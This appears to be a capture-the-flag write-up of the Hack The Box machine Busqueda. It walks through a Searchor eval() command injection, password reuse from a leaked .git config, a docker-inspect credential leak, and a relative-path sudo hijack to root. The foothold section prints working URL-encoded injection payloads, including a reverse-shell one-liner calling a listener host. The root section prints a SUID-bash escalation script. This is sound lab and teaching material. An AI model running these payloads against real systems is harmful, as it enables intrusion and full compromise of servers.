---
layout: post
title: "HTB: Busqueda"
subtitle: "Searchor eval() command injection for a shell, .git creds reused over SSH, relative-path script hijack to root"
date: 2023-04-13
tags: [htb, linux, rce, command-injection, privesc]
category: writeups
kind: machine
tldr: "searcher.htb ran a Flask wrapper over Searchor 2.4.0, which builds an eval() string from user input. A crafted query gave RCE as svc. A leaked .git config held cody's password, reused for the svc SSH account. A root sudo script (system-checkup.py) called full-checkup.sh by relative path, so dropping a malicious one in my own dir and running the sudo command gave root. A docker-inspect side path leaked the Gitea admin password to read the script source."
---

## the box

Busqueda is an easy Linux box running Apache on 80 and SSH on 22. Port 80 serves `searcher.htb`, a Flask app that wraps the `Searchor` Python library to build search-engine URLs. Behind Apache there is a Gitea instance and a couple of Docker containers on localhost. The path: a known eval bug in Searchor for the foothold, password reuse from a checked-out repo for user, and a sloppy sudo script for root.

## recon

```bash
nmap -p- --min-rate 10000 10.129.48.49
nmap -p 22,80 -sCV 10.129.48.49
```

Two ports.

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
```

Port 80 redirected to `http://searcher.htb`, so into `/etc/hosts` it went:

```
10.129.48.49 searcher.htb
```

The site is a search-URL generator. The footer and the page advertised the stack: Flask `2.1.2` on Werkzeug `2.1.2` / Python `3.10.6` (Ubuntu 22.04), built on `Searchor 2.4.0`. The one interesting route is `/search`, which takes `engine` and `query` and returns a generated URL.

```
/search   (Status: 405)   # GET not allowed, it is POST only
```

## foothold

### Searchor 2.4.0 eval() injection

Searchor `<= 2.4.0` builds its URL by `eval`-ing a string with the query inlined (SNYK-PYTHON-SEARCHOR-3166303). The vulnerable line:

```python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

Because `query` is concatenated straight into the eval string inside single quotes, I can close the quote, inject Python, and re-open the quote so the rest still parses. The clean breakout is to wrap the injection in `eval(compile(...))` so I can run multi-line code (an import plus an `os.system`) inside the single expression Searchor expects:

```
engine=BBC&query=http://127.0.0.1/'+eval(compile('for x in range(1):\n import os\n os.system("id")','a','single'))+'&auto_redirect=
```

URL-encoded for the POST body:

```
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded

engine=BBC&query=http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("id")','a','single'))%2b'&auto_redirect=
```

That executed `id` server-side. Swapping `id` for a reverse shell over the same structure landed a shell as `svc` (I had a `nc` listener on 3333):

```
engine=BBC&query=http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.14.234+3333+>/tmp/f")','a','single'))%2b'&auto_redirect=
```

```bash
nc -lvnp 3333
# connection back as svc
```

A simpler one-liner breakout also works if you prefer it: `query=' + __import__('os').popen('id').read() + '`.

## user

As svc I looked at the app directory and found a Gitea checkout under `/var/www/app/.git`. The remote URL in its config embedded credentials:

```ini
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

That password, `jh1usoih2bkjaspwe92`, was reused for the svc SSH account:

```bash
ssh svc@searcher.htb   # password: jh1usoih2bkjaspwe92
```

svc held the user flag.

## root

### the sudo script

```bash
sudo -l
```

svc could run one Python script as root with any arguments:

```
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Running it blind showed three actions and that it actually executes things:

```
docker-ps      : List running docker containers
docker-inspect : Inspect a certain docker container
full-checkup   : Run a full system checkup
```

`full-checkup` just said "Something went wrong" from `/opt/scripts`, which was a hint that it depends on the working directory. `docker-ps` showed the two containers:

```
gitea/gitea:latest   ...   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
mysql:8              ...   127.0.0.1:3306->3306/tcp                          mysql_db
```

### docker-inspect side path to the Gitea admin

`docker-inspect` takes a Go template format and a container, and runs `docker inspect --format <fmt> <container>` as root. Asking for the whole `.Config` dumps the container environment, which for the MySQL container includes the DB passwords in cleartext:

{% raw %}
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
```
{% endraw %}

```
"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea",
       "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea", ...]
```

The `MYSQL_PASSWORD` (`yuiu1hoiu4i5ho1uh`) was reused as the Gitea **administrator** web password. I tunnelled or added `gitea.searcher.htb` to hosts, logged in as `administrator:yuiu1hoiu4i5ho1uh`, and that exposed the private `scripts` repository holding the source of `system-checkup.py`. Reading the source confirmed exactly how the third action runs.

### the relative-path bug

The `full-checkup` branch builds its command from a relative path, not an absolute one:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

`run_command` is `subprocess.run(arg_list, ...)`, so `./full-checkup.sh` resolves against the current working directory. The script runs as root because the whole thing runs under sudo, so whatever `full-checkup.sh` sits in my CWD is what root executes. That is why it failed from `/opt/scripts` (no such script there) and is the entire vulnerability.

### exploiting it

I made a writable working dir, dropped my own `full-checkup.sh` that SUIDs bash, and invoked the sudo command from there:

```bash
mkdir ~/temp && cd ~/temp
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Root ran my script, `/bin/bash` picked up the SUID bit, and `bash -p` kept the root euid:

```bash
bash -p
# id -> euid=0(root); cat /root/root.txt
```

## takeaway

An eval-based library bug handed the foothold, credentials sat unencrypted in a checked-out `.git` config and were reused for SSH, and a root sudo script called its helper by relative path so I controlled what root executed. The docker-inspect detour is a clean secondary lesson: `docker inspect .Config` leaks every container env var, and reusing a DB password as a web admin password chains it into source disclosure. Pin helper scripts to absolute paths, do not embed secrets in repos or container env vars, and never reuse passwords across tiers.
